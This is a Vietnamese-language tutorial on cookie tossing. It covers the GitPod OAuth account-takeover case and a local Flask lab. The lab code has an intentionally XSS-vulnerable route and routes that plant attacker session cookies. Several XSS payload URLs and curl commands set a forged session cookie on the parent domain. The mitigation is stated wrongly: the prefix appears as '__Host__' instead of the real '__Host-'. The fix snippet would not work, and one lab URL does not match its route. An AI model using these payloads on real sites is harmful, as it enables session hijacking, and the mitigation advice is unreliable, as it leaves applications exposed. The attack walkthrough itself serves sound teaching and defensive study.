# Hijacking OAuth Flows via Cookie Tossing

**Tác giả:** Elliot Ward  
**Chia sẻ:**  
Tìm hiểu về **tấn công Cookie Tossing**, một kỹ thuật ít được biết đến để chiếm quyền điều khiển luồng OAuth và thực hiện chiếm đoạt tài khoản tại các Nhà cung cấp Danh tính (IdPs). Khám phá tác động, ví dụ thực tế, cách thiết lập môi trường test (bao gồm khai thác XSS và ghi đè cookie), và cách bảo vệ ứng dụng bằng tiền tố cookie **__Host__**.

## Nội dung bài viết
- [Cookie Tossing là gì?](#cookie-tossing-là-gì)
- [Khai thác Cookie Tossing](#khai-thác-cookie-tossing)
- [Thăm lại GitPod](#thăm-lại-gitpod)
- [Cấu hình môi trường test](#cấu-hình-môi-trường-test)
- [Tiền tố cookie __Host__](#tiền-tố-cookie-__host__)

## Cookie Tossing là gì?

**Cookie Tossing** là kỹ thuật cho phép một **subdomain** (ví dụ: `securitylabs.snyk.io`) thiết lập cookie trên **domain cha** (ví dụ: `snyk.io`). Kỹ thuật này thường bị bỏ qua hoặc ít được biết đến, dẫn đến ít tài liệu nghiên cứu. Bài viết này giải thích chi tiết cách Cookie Tossing có thể chiếm quyền điều khiển luồng OAuth và gây ra chiếm đoạt tài khoản tại Nhà cung cấp Danh tính (IdP).

### HTTP Cookies là gì?

Theo chuẩn **RFC 6265**, **cookie** là một mẩu dữ liệu nhỏ được trao đổi giữa máy chủ và trình duyệt web của người dùng. Cookie rất quan trọng trong các ứng dụng web vì chúng:
- Lưu trữ dữ liệu giới hạn.
- Duy trì trạng thái (state) cho giao thức HTTP vốn không lưu trạng thái.
- Cho phép duy trì phiên người dùng, lưu trữ tùy chọn và cung cấp trải nghiệm cá nhân hóa.

#### Các thuộc tính và cờ của cookie

Cookie có các **thuộc tính (attributes)** và **cờ (flags)** định nghĩa hành vi và phạm vi của chúng. Dưới đây là các thuộc tính và cờ chính:

| Thuộc tính   | Mô tả | Ví dụ |
|-------------|-------|-------|
| Expires     | Đặt ngày và giờ hết hạn của cookie. | `Expires=Wed, 21 Oct 2024 07:28:00 GMT` |
| Max-Age     | Xác định thời gian sống của cookie (tính bằng giây). | `Max-Age=3600` (1 giờ) |
| Domain      | Chỉ định domain mà cookie có hiệu lực, cho phép các subdomain truy cập. | `Domain=.example.com` |
| Path        | Giới hạn cookie cho một đường dẫn cụ thể trong domain. | `Path=/account` |
| SameSite    | Kiểm soát việc gửi cookie trong các yêu cầu cross-site để bảo vệ chống CSRF. Giá trị: `Strict`, `Lax`, `None`. | `SameSite=Lax` |

| Cờ         | Mô tả | Ví dụ |
|------------|-------|-------|
| Secure     | Đảm bảo cookie chỉ được gửi qua HTTPS. | `Secure` |
| HttpOnly   | Ngăn cookie bị truy cập qua JavaScript, tăng cường bảo mật. | `HttpOnly` |

Những thuộc tính và cờ này xác định thời gian sống, phạm vi và bảo mật của cookie, giúp quản lý phiên người dùng một cách hiệu quả và an toàn.

### Cách thiết lập cookie

Cookie có thể được thiết lập bằng hai cách chính:

1. **Sử dụng header Set-Cookie trong phản hồi HTTP**:
```
HTTP/1.1 200 OK
Set-Cookie: userId=patch01; Expires=Wed, 21 Oct 2024 07:28:00 GMT; Domain=.example.com; Path=/; Secure; HttpOnly; SameSite=Lax
```

2. **Sử dụng JavaScript Cookie API**:
```javascript
document.cookie = "userId=patch01; expires=Wed, 21 Oct 2024 07:28:00 GMT; path=/; domain=.example.com; secure; samesite=lax";
```

Trong trình duyệt, cookie được lưu trữ dưới dạng **tuple** gồm **key**, **value** và **các thuộc tính**. Khi trình duyệt gửi cookie về máy chủ, chỉ **key** và **value** được gửi, không bao gồm các thuộc tính. Trình duyệt giới hạn số lượng cookie tối đa cho mỗi domain.

### Cookie Domains

Thuộc tính **Domain** xác định domain nào có thể truy cập cookie. Mặc định, cookie chỉ có hiệu lực với domain đã thiết lập nó. Tuy nhiên, thuộc tính **Domain** có thể mở rộng phạm vi truy cập. Ví dụ:
- Nếu `blog.example.com` đặt cookie với `Domain=.example.com`, cookie này sẽ khả dụng cho tất cả subdomain của `example.com` (như `app.example.com`, `example.com`).
- Ngược lại, domain cha (`example.com`) không thể đặt cookie chỉ dành riêng cho một subdomain cụ thể (như `blog.example.com`).

### Cookie Paths và Thứ tự

Thuộc tính **Path** xác định các URL mà cookie áp dụng. Mặc định, cookie có hiệu lực với đường dẫn của URL tạo ra nó và các thư mục con. Ví dụ:
- Cookie với `Path=/account` sẽ khả dụng cho `/account` và `/account/settings`.
- Cookie được ưu tiên theo **độ cụ thể** của **Path**: cookie với đường dẫn cụ thể hơn (như `/account/settings`) được gửi trước cookie với đường dẫn ít cụ thể hơn (như `/account`).

## Khai thác Cookie Tossing

**Cookie Tossing** lợi dụng thuộc tính **Domain** và **Path** để tấn công. Khi kẻ tấn công kiểm soát một subdomain (qua lỗ hổng XSS hoặc thiết kế của dịch vụ), họ có thể đặt cookie trên domain cha. Điều này có thể dẫn đến:
- Thiết lập cookie phiên của kẻ tấn công trên trình duyệt của nạn nhân cho các endpoint cụ thể.
- Ví dụ: Kẻ tấn công đặt cookie với `Domain=.example.com` và `Path=/api/payment`. Khi nạn nhân truy cập endpoint này, ứng dụng sẽ sử dụng cookie của kẻ tấn công thay vì cookie của nạn nhân, dẫn đến việc thông tin nhạy cảm (như phương thức thanh toán) bị thêm vào tài khoản của kẻ tấn công.

### Thách thức khi khai thác
- **CSRF tokens**: Nếu ứng dụng sử dụng token chống CSRF, yêu cầu hợp pháp từ nạn nhân có thể thất bại do token không khớp.
- Tuy nhiên, nhiều API dựa trên JSON không sử dụng CSRF tokens, dựa vào **Same Origin Policy (SOP)** và **CORS**. Điều này khiến chúng dễ bị tấn công từ subdomain.
- **SameSite** không bảo vệ chống lại Cookie Tossing vì subdomain được coi là cùng "site" theo định nghĩa của SameSite (kể cả với `Lax` hoặc `Strict`).

##  GitPod

**GitPod** là một môi trường phát triển đám mây (Cloud Development Environment - CDE) cho phép triển khai môi trường phát triển nhanh chóng. Các môi trường này được lưu trữ trên subdomain của `gitpod.io`, và người dùng có thể thực thi JavaScript trên các subdomain này.

### Tấn công Cookie Tossing trên GitPod
Các nhà nghiên cứu đã kiểm tra luồng OAuth của GitPod với các nhà cung cấp như GitHub hoặc BitBucket. Bằng cách:
1. Tạo JavaScript trên một instance GitPod (như `redacted.ws–eu114.gitpod.io`) để đặt cookie `_gitpod_io_jwt2_` với giá trị phiên của kẻ tấn công, với đường dẫn:
   - `/api/authorize`
   - `/auth/bitbucket/callback`
2. Gửi URL của workspace chứa JavaScript độc hại đến nạn nhân.

Khi nạn nhân truy cập URL, cookie của kẻ tấn công được thiết lập. Khi nạn nhân kết nối tài khoản GitHub/BitBucket, luồng OAuth sẽ sử dụng cookie của kẻ tấn công, dẫn đến việc tài khoản Git của nạn nhân bị liên kết với tài khoản GitPod của kẻ tấn công. Điều này cho phép kẻ tấn công:
- Tạo workspace từ các kho mã nguồn của nạn nhân.
- Thay đổi mã nguồn hoặc đẩy commit mới.

### Kết quả
Lỗ hổng này được báo cáo cho GitPod vào ngày **26/06/2024** và được khắc phục vào ngày **01/07/2024** bằng cách sử dụng tiền tố cookie **__Host__**. Lỗ hổng được gán mã **CVE-2024-21583**.

## Cấu hình môi trường test

Để kiểm tra hoặc tái hiện tấn công **Cookie Tossing**, bạn có thể thiết lập một môi trường thử nghiệm cục bộ sử dụng **Python** với framework **Flask** để tạo server đơn giản với domain cha và subdomain. Phần này bao gồm:
- Ví dụ sử dụng **lỗ hổng XSS** để thiết lập cookie độc hại trên subdomain.
- Kiểm tra việc **ghi đè cookie** khi root domain đã thiết lập cookie trước đó, minh họa cách subdomain ghi đè cookie của domain cha.

### Yêu cầu
- **Python** (phiên bản 3.8 trở lên).
- **pip** để cài đặt các gói.
- Trình duyệt web (Chrome, Firefox, v.v.).
- File cấu hình DNS cục bộ (`hosts`) để giả lập subdomain.

### Các bước thiết lập

1. **Cài đặt Python và Flask**:
   - Cài Python từ [python.org](https://www.python.org).
   - Tạo một thư mục dự án:
     ```
     mkdir cookie-tossing-test
     cd cookie-tossing-test
     pip install flask markupsafe
     ```

2. **Tạo server đơn giản**:
   - Tạo file `server.py` để mô phỏng một ứng dụng web với domain cha, subdomain, một endpoint có lỗ hổng XSS, và một endpoint để kiểm tra ghi đè cookie:
```python
from flask import Flask, request, make_response
from markupsafe import escape

app = Flask(__name__)

# Route cho domain cha (example.com)
@app.route('/')
def home():
    response = make_response('Domain cha: example.com - Cookie parent-session đã được thiết lập')
    response.set_cookie('session', 'parent-session', domain='.example.com', path='/', httponly=True, samesite='Lax')
    return response

# Route cho subdomain (sub.example.com) - Trang bình thường
@app.route('/sub')
def sub():
    response = make_response('Subdomain: sub.example.com - Cookie attacker-session đã được thiết lập')
    response.set_cookie('session', 'attacker-session', domain='.example.com', path='/api', httponly=True, samesite='Lax')
    return response

# Route mô phỏng lỗ hổng XSS trên subdomain
@app.route('/sub/xss')
def xss():
    user_input = request.args.get('input', '')
    # Lỗ hổng XSS: hiển thị input mà không mã hóa đầy đủ
    response = make_response(f'Subdomain: sub.example.com - Input: {user_input}')
    return response

# Route kiểm tra ghi đè với cùng Path=/
@app.route('/sub/override')
def override():
    response = make_response('Subdomain: sub.example.com - Cookie override-session đã được thiết lập với Path=/')
    response.set_cookie('session', 'override-session', domain='.example.com', path='/', httponly=True, samesite='Lax')
    return response

# Route mô phỏng API endpoint
@app.route('/api')
def api():
    session = request.cookies.get('session', 'Không có session')
    return f'API endpoint, session: {session}'

# Route kiểm tra cookie cho domain cha
@app.route('/check')
def check():
    session = request.cookies.get('session', 'Không có session')
    return f'Check endpoint, session: {session}'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

3. **Cấu hình DNS cục bộ**:
   - Chỉnh sửa file `hosts` trên máy tính để giả lập domain và subdomain:
     - Windows: `C:\Windows\System32\drivers\etc\hosts`
     - macOS/Linux: `/etc/hosts`
   - Thêm các dòng sau:
     ```
     127.0.0.1 example.com
     127.0.0.1 sub.example.com
     ```

4. **Chạy server**:
   - Chạy lệnh:
     ```
     python server.py
     ```
   - Truy cập:
     - Domain cha: `http://example.com:5000`
     - Subdomain: `http://sub.example.com:5000/sub`
     - XSS endpoint: `http://sub.example.com:5000/sub/xss`
     - Override endpoint: `http://sub.example.com:5000/override`
     - API endpoint: `http://example.com:5000/api`
     - Check endpoint: `http://example.com:5000/check`

5. **Kiểm tra tấn công Cookie Tossing thông qua XSS**:
   - **Khai thác XSS để đặt cookie**:
     - Truy cập URL sau để chèn mã JavaScript độc hại qua lỗ hổng XSS:
       ```
       http://sub.example.com:5000/sub/xss?input=<script>document.cookie="session=attacker-xss-session; domain=.example.com; path=/api; samesite=lax";</script>
       ```
     - Mã JavaScript này sẽ chạy trong trình duyệt của nạn nhân, thiết lập cookie `session=attacker-xss-session` với `Domain=.example.com` và `Path=/api`.
   - **Xác minh cookie**:
     - Mở Developer Tools trong trình duyệt (tab Application > Cookies) để kiểm tra xem cookie `session=attacker-xss-session` đã được thiết lập cho `example.com` chưa.
   - **Kiểm tra tấn công**:
     - Truy cập `http://example.com:5000/api`. Nếu server trả về `API endpoint, session: attacker-xss-session`, tấn công Cookie Tossing qua XSS đã thành công, vì cookie từ XSS đã ghi đè cookie của domain cha cho endpoint `/api`.

6. **Kiểm tra tấn công Cookie Tossing thông qua route /sub**:
   - Truy cập `http://sub.example.com:5000/sub`. Bạn sẽ thấy thông báo: `Subdomain: sub.example.com - Cookie attacker-session đã được thiết lập`.
   - Mở Developer Tools (tab Application > Cookies) để xác minh rằng cookie `session=attacker-session` đã được thiết lập với `Domain=.example.com` và `Path=/api`.
   - Truy cập `http://example.com:5000/api`. Nếu server trả về `API endpoint, session: attacker-session`, tấn công Cookie Tossing đã thành công.

7. **Kiểm tra ghi đè cookie khi root domain đã thiết lập cookie**:
   - **Bước 1: Thiết lập cookie từ root domain**:
     - Truy cập `http://example.com:5000` để thiết lập cookie `session=parent-session` với `Domain=.example.com` và `Path=/`.
     - Kiểm tra trong Developer Tools (tab Application > Cookies) để xác minh cookie `session=parent-session` đã được thiết lập.
   - **Bước 2: Thử ghi đè từ subdomain với Path cụ thể hơn**:
     - Truy cập `http://sub.example.com:5000/sub` để thiết lập cookie `session=attacker-session` với `Path=/api`.
     - Truy cập `http://example.com:5000/api`. Server sẽ trả về `API endpoint, session: attacker-session`, vì cookie với `Path=/api` được ưu tiên hơn `Path=/` cho endpoint `/api`.
     - Truy cập `http://example.com:5000/check`. Server sẽ trả về `Check endpoint, session: parent-session`, vì endpoint `/check` không nằm trong `Path=/api`, nên cookie `parent-session` với `Path=/` được sử dụng.
   - **Bước 3: Thử ghi đè từ subdomain với cùng Path=/**:
     - Truy cập `http://sub.example.com:5000/override` để thiết lập cookie `session=override-session` với `Path=/`.
     - Truy cập `http://example.com:5000/check`. Server sẽ trả về `Check endpoint, session: override-session`, vì cookie `override-session` được thiết lập sau cùng và có cùng `Path=/` nên ghi đè cookie `parent-session`.
   - **Bước 4: Thử ghi đè qua XSS**:
     - Truy cập:
       ```
       http://sub.example.com:5000/sub/xss?input=<script>document.cookie="session=attacker-xss-session; domain=.example.com; path=/; samesite=lax";</script>
       ```
     - Truy cập `http://example.com:5000/check`. Server sẽ trả về `Check endpoint, session: attacker-xss-session`, vì cookie `attacker-xss-session` được thiết lập qua XSS với `Path=/` và ghi đè cookie trước đó.

### Xử lý lỗi khi cookie không được thiết lập
Nếu cookie không được thiết lập khi truy cập `/sub`, `/sub/xss`, hoặc `/override`, hãy kiểm tra các vấn đề sau:
- **Lỗi ImportError với `escape`**:
  - Nếu bạn gặp lỗi `ImportError: cannot import name 'escape' from 'flask'`, điều này do Flask phiên bản mới (2.3.0 trở lên) không còn export hàm `escape`. Code trên đã sử dụng `from markupsafe import escape`. Đảm bảo cài đặt gói `markupsafe`:
    ```
    pip install markupsafe
    ```
- **HTTPS và Secure flag**: Code trên đã loại bỏ `secure=True` để phù hợp với localhost (HTTP). Nếu bạn thêm `secure=True`, trình duyệt sẽ từ chối cookie trên HTTP. Hãy thử thiết lập HTTPS cục bộ (sử dụng `mkcert` hoặc `OpenSSL`) nếu cần.
- **Cấu hình file hosts**: Đảm bảo file `hosts` có các dòng:
  ```
  127.0.0.1 example.com
  127.0.0.1 sub.example.com
  ```
  Nếu subdomain không được ánh xạ đúng, cookie sẽ không được thiết lập.
- **Cú pháp cookie**: Trong các route, kiểm tra cú pháp `response.set_cookie`. Đảm bảo `domain='.example.com'` (dấu chấm đầu là cần thiết) và các thuộc tính khác như `path`, `httponly`, `samesite` đúng.
- **XSS không hoạt động**: Đảm bảo trình duyệt không chặn JavaScript. Trong Developer Tools (tab Console), kiểm tra xem có lỗi như `Refused to execute script` không. Nếu có, thử vô hiệu hóa các tính năng bảo mật của trình duyệt (chỉ trong môi trường test).
- **Cổng server**: Đảm bảo truy cập đúng cổng `5000` (ví dụ: `http://sub.example.com:5000/sub`). Nếu cổng sai, server sẽ không phản hồi.
- **Kiểm tra header**: Sử dụng `curl` để kiểm tra response header:
  ```
  curl -v http://sub.example.com:5000/sub
  curl -v http://sub.example.com:5000/override
  curl -v http://sub.example.com:5000/sub/xss?input=<script>document.cookie="session=attacker-xss-session; domain=.example.com; path=/api; samesite=lax";</script>
  ```
  Đảm bảo header `Set-Cookie` xuất hiện với giá trị đúng.
- **Kiểm tra XSS payload**: Đảm bảo URL XSS được mã hóa đúng. Nếu trình duyệt hoặc server chặn `<script>`, thử mã hóa URL:
  ```
  http://sub.example.com:5000/sub/xss?input=%3Cscript%3Edocument.cookie%3D%22session%3Dattacker-xss-session%3B%20domain%3D.example.com%3B%20path%3D%2Fapi%3B%20samesite%3Dlax%22%3B%3C%2Fscript%3E
  ```

### Công cụ đề xuất
- **cURL** để kiểm tra response header:
  ```
  curl -v http://sub.example.com:5000/sub
  curl -v http://sub.example.com:5000/override
  curl -v http://sub.example.com:5000/sub/xss?input=<script>document.cookie="session=attacker-xss-session; domain=.example.com; path=/api; samesite=lax";</script>
  ```
- **Postman** để gửi yêu cầu và xem cookie.
- Developer Tools của trình duyệt (tab Network hoặc Application > Cookies) để xác minh cookie.

### Kiểm tra tiền tố __Host__
Để kiểm tra tác động của tiền tố `__Host__`, sửa cookie của domain cha trong `server.py` thành:
```python
response.set_cookie('session', 'parent-session', path='/', httponly=True, samesite='Lax')
response.headers.add('Set-Cookie', 'session=parent-session; __Host__')
```
Sau đó, truy cập lại `/sub`, `/sub/xss`, hoặc `/override` và `/api` hoặc `/check` để xác minh rằng cookie của subdomain (qua `Set-Cookie` hoặc XSS) không thể ghi đè cookie của domain cha.

## Tiền tố cookie __Host__

Tiền tố **__Host__** là giải pháp đơn giản để ngăn chặn Cookie Tossing. Khi sử dụng **__Host__**:
- Cookie chỉ có hiệu lực với domain đã thiết lập nó.
- Không thể sửa đổi thuộc tính **Domain** hoặc **Path**, ngăn subdomain đặt cookie trên domain cha hoặc nhắm vào đường dẫn cụ thể.

## Kết luận

**Cookie Tossing** là một lỗ hổng độc đáo và thường bị bỏ qua, ảnh hưởng đến các ứng dụng không sử dụng tiền tố **__Host__**. Kỹ thuật này có thể bị khai thác để chiếm quyền điều khiển các yêu cầu nhạy cảm, đặc biệt trong các luồng phức tạp như OAuth, dẫn đến việc lộ dữ liệu hoặc cấp quyền truy cập trái phép. Lỗ hổng XSS làm tăng mức độ nguy hiểm của Cookie Tossing bằng cách cho phép kẻ tấn công chèn mã JavaScript để đặt cookie độc hại. Môi trường test sử dụng Python/Flask ở trên minh họa rõ cách subdomain có thể ghi đè cookie của root domain (khi đã được thiết lập trước) bằng cách sử dụng `Path` cụ thể hơn hoặc cùng `Path` với thời gian thiết lập mới hơn, cũng như cách bảo vệ bằng tiền tố `__Host__`.

